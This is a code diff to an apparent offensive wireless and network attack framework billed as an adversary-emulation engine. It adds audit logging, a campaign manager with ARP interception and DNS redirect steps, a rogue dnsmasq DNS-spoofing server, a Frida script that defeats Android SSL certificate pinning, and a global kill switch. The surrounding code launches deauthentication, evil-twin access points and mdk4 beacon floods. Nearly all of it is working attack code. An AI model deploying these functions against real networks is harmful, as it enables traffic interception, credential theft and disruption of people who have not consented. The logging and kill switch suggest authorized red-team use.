@@ -4,8 +4,8 @@ import os
 import tempfile
 import time
 
-from models import Campaign, CampaignStep
 from database import SessionLocal
+from accountability import log_action
 
 import models
 from database import SessionLocal
@@ -16,6 +16,7 @@ arp_spoof_proc = None       # arpspoof process
 dns_hijacked_domains = []   # Targeted domains
 evil_twin_proc = None       # airbase-ng process
 dnsmasq_proc = None         # dnsmasq process
+dns_spoof_proc = None       # standalone dnsmasq for spoofing
 beacon_flood_proc = None    # mdk4 process
 
 
@@ -69,6 +70,7 @@ def trigger_deauth(interface, bssid, channel=None, client_mac=None):
 
         active_attacks[bssid] = process
         mode = f"targeted at {client_mac}" if client_mac else "broadcast"
+        log_action(f"Deauth Strike ({mode})", target=bssid)
         print(f"[+] Strike group deployed against {bssid} ({mode})")
         return {"success": True, "message": "Attack initiated", "mode": mode}
 
@@ -86,6 +88,7 @@ def stop_deauth(bssid):
             process.terminate()
             process.wait(timeout=2)
             del active_attacks[bssid]
+            log_action("Halt Deauth Strike", target=bssid)
             return {"success": True, "message": "Attack stopped"}
         else:
             return {"success": False, "error": "No active attack found for this BSSID"}
@@ -164,8 +167,10 @@ log-dhcp"""
         
         time.sleep(1.0)
         if dnsmasq_proc.poll() is not None:
+            log_action("Evil Twin Engaged (Partial Failure)", target=ssid, outcome="Partial Success")
             return {"success": True, "message": f"Evil Twin Active, but DHCP (dnsmasq) failed."}
 
+        log_action("Evil Twin Engaged", target=ssid)
         return {"success": True, "message": f"Evil Twin Active. Karma: {karma_mode}, Portal: {captive_portal}"}
 
     except Exception as e:
@@ -193,6 +198,7 @@ def stop_evil_twin():
         with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
             f.write('0')
 
+        log_action("Evil Twin Neutralized")
         return {"success": True, "message": "Evil Twin neutralized and Network restored"}
     except Exception as e:
         return {"success": False, "error": str(e)}
@@ -225,6 +231,7 @@ def trigger_beacon_flood(interface, channel=6):
             err = stderr.strip() or stdout.strip() or "mdk4 exited immediately"
             return {"success": False, "error": f"Beacon Flood Failed: {err}"}
 
+        log_action("Beacon Flood Engaged", target=f"CH{channel}")
         return {"success": True, "message": f"Beacon flood active on CH{channel}"}
 
     except FileNotFoundError:
@@ -234,14 +241,22 @@ def trigger_beacon_flood(interface, channel=6):
 
 
 def stop_beacon_flood():
-    """Stops the mdk4 beacon flood."""
+    """Stops the mdk4 beacon flood strike using high-priority termination."""
     global beacon_flood_proc
-    if beacon_flood_proc:
-        print("[*] CEASING OFFENSIVE LAYER: Stopping Beacon Flood Strike")
-        beacon_flood_proc.terminate()
-        beacon_flood_proc = None
-        return {"success": True}
-    return {"success": False, "error": "No active flood found"}
+    try:
+        # 1. Kill the tracked process (if exists)
+        if beacon_flood_proc:
+            print("[*] CEASING OFFENSIVE LAYER: Sending SIGKILL to mdk4")
+            beacon_flood_proc.kill() # kill() is SIGKILL
+            beacon_flood_proc = None
+        
+        # 2. System-wide fallback (ensures no orphans from previous crashes)
+        subprocess.run(['killall', '-9', 'mdk4'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        log_action("Beacon Flood Neutralized")
+        return {"success": True, "message": "Beacon flood strike neutralized."}
+    except Exception as e:
+        return {"success": False, "error": f"Suppression failed: {str(e)}"}
 
 
 # ─── Adversary Emulation Engine (AEE) ──────────────────────────────────────────
@@ -297,6 +312,14 @@ class CampaignManager:
                 elif action == "karma_portal":
                     # Hard-cloning for now
                     res = trigger_evil_twin("wlan1", bssid, "Target_Clone", 6, karma_mode=True, captive_portal=True)
+                elif action == "arp_intercept":
+                    target_ip = step_cfg.get('target_ip')
+                    gw_ip = get_gateway_ip()
+                    res = trigger_arp_spoof("eth0", target_ip, gw_ip)
+                elif action == "dns_redirect":
+                    domain = step_cfg.get('domain')
+                    redirect = step_cfg.get('redirect', '10.0.0.1')
+                    res = trigger_dns_hijack(domain, redirect)
                 
                 success = res.get('success', False)
                 step.status = "Success" if success else "Failed"
@@ -348,6 +371,7 @@ def trigger_arp_spoof(interface, target_ip, gateway_ip):
              out, err = arp_spoof_proc.communicate()
              return {"success": False, "error": f"arpspoof failed: {err or out}"}
              
+        log_action("ARP Interception Engaged", target=target_ip)
         return {"success": True, "message": f"ARP Interception Active against {target_ip}"}
     except Exception as e:
         return {"success": False, "error": str(e)}
@@ -357,6 +381,7 @@ def stop_arp_spoof():
     if arp_spoof_proc:
         arp_spoof_proc.terminate()
         arp_spoof_proc = None
+        log_action("ARP Interception Neutralized")
         return {"success": True}
     return {"success": False, "error": "No active ARP spoof"}
 
@@ -372,6 +397,7 @@ def trigger_dns_hijack(domain, redirect_ip="10.0.0.1"):
         
         # We need to restart the Evil Twin or dnsmasq to apply
         # For simplicity, we'll assume the manager handles the config file
+        log_action("DNS Hijack Rule Staged", target=domain)
         return {"success": True, "message": f"Hijack rule staged for {domain}"}
     except Exception as e:
         return {"success": False, "error": str(e)}
@@ -381,6 +407,72 @@ def is_beacon_flood_active():
     global beacon_flood_proc
     return beacon_flood_proc is not None and beacon_flood_proc.poll() is None
 
+# ─── Tactical DNS Spoofing & SSL Bypass (Phase 4) ───────────────────────────
+
+def trigger_dns_spoof(interface, domains):
+    """
+    Starts a rogue DNS server on the specified interface.
+    domains: List of {"domain": "example.com", "ip": "10.0.0.1"}
+    """
+    global dns_spoof_proc
+    try:
+        print(f"[*] DNS SPOOF: Starting rogue server on {interface} with {len(domains)} rules")
+        
+        # Kill any conflicting dnsmasq
+        subprocess.run(['killall', 'dnsmasq'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        conf_lines = [
+            f"interface={interface}",
+            "bind-interfaces",
+            "log-queries",
+            "log-dhcp",
+            "server=8.8.8.8" # Upstream fallback
+        ]
+        
+        for d in domains:
+            conf_lines.append(f"address=/{d['domain']}/{d['ip']}")
+            
+        conf_path = "/tmp/aegis_dns_spoof.conf"
+        with open(conf_path, "w") as f:
+            f.write("\n".join(conf_lines))
+            
+        dns_spoof_proc = subprocess.Popen(['dnsmasq', '-C', conf_path, '-d'], 
+                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        
+        time.sleep(1.0)
+        if dns_spoof_proc.poll() is not None:
+             out, err = dns_spoof_proc.communicate()
+             return {"success": False, "error": f"dnsmasq failed: {err or out}"}
+             
+        log_action("DNS Spoofing Active")
+        return {"success": True, "message": "DNS Spoofing Server Active"}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+def stop_dns_spoof():
+    global dns_spoof_proc
+    if dns_spoof_proc:
+        dns_spoof_proc.terminate()
+        dns_spoof_proc = None
+        return {"success": True}
+    return {"success": False, "error": "No active DNS spoofing"}
+
+def setup_ssl_bypass():
+    """
+    Infrastructure for mobile SSL bypass using Frida.
+    Returns the standard bypass script for user injection.
+    """
+    frida_script = """
+    Java.perform(function() {
+        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
+        TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocsp, certPin) {
+            console.log('[+] AEGIS: Bypassing SSL Pinning for: ' + host);
+            return untrustedChain;
+        };
+    });
+    """
+    return {"success": True, "script": frida_script}
+
 
 # ─── Status Summary ───────────────────────────────────────────────────────────
 
@@ -389,4 +481,41 @@ def get_full_status():
         "active_deauths": list(active_attacks.keys()),
         "evil_twin_active": is_evil_twin_active(),
         "beacon_flood_active": is_beacon_flood_active(),
+        "arp_spoof_active": arp_spoof_proc is not None and arp_spoof_proc.poll() is None,
+        "dns_spoof_active": dns_spoof_proc is not None and dns_spoof_proc.poll() is None
     }
+
+def get_gateway_ip():
+    """Tactical helper to discover the gateway IP of the current network."""
+    try:
+        result = subprocess.run(['ip', 'route', 'show', 'default'], capture_output=True, text=True)
+        if result.returncode == 0:
+            parts = result.stdout.split()
+            if 'via' in parts:
+                return parts[parts.index('via') + 1]
+    except:
+        pass
+    return "10.0.0.1" # Fallback to standard local gateway
+
+def stop_all_offensive_operations():
+    """Global Kill-Switch: Neutralizes all active attack vectors instantly."""
+    print("[!!!] GLOBAL_DISENGAGE: Terminating all tactical processes")
+    
+    # 1. Stop Deauths
+    for bssid in list(active_attacks.keys()):
+        stop_deauth(bssid)
+    
+    # 2. Stop Evil Twin & Beacon Flood
+    stop_evil_twin()
+    stop_beacon_flood()
+    
+    # 3. Stop ARP & DNS Spoofs
+    stop_arp_spoof()
+    stop_dns_spoof()
+    
+    # 4. Final Cleanup (System wide)
+    subprocess.run(['killall', '-9', 'aireplay-ng', 'airbase-ng', 'mdk4', 'arpspoof', 'dnsmasq'], 
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
+    log_action("GLOBAL_KILL_SWITCH_ENGAGED", outcome="Emergency Neutralized")
+    return {"success": True, "message": "Global Disengage Complete. Airspace Neutralized."}
